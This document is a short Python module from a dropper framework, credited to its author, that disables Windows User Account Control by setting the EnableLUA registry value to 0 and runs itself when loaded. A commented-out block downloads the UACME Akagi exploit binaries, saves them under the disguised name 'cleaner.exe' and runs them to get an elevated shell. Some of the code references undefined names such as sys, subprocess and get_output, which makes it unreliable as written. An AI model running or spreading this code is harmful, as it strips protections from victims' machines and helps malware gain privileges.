#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#This script aims to bypass UAC by trying to disable the UAC (¯\_(ツ)_/¯)
'''
#Bypassing UAC by downloading and using UACme tool (¯\_(ツ)_/¯)
from os import popen
from sys import version_info
from platform import architecture
if sys.version_info[0]==3:
	from urllib.request import urlopen
elif sys.version_info[0]==2:
	from urllib import urlopen

def get_ready():
	import urllib,platform,os
	url32 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi32.exe"
	url64 = "https://github.com/hfiref0x/UACME/raw/master/Compiled/Akagi64.exe"
	url   = ""
	#check architecture
	if architecture()[0][:2] == '64':
		url = url64
	elif architecture()[0][:2] == '32':
		url = url32
	x = urlretrieve(url,"cleaner.exe")
	xx = popen("cleaner.exe 3 cmd.exe")
'''
#Start

def DisUAC():
	def disable_uac():
		x=subprocess.Popen("REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f >> NUL",shell=True)
#####
	def check_uac():
		uac = get_output("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA")
		if "0x1" in uac:
			return True
		else:
			return False
#######
	if check_uac():
		disable_uac()
		if check_uac():
			return False
		else:
			return True
	else:
		return True

DisUAC()
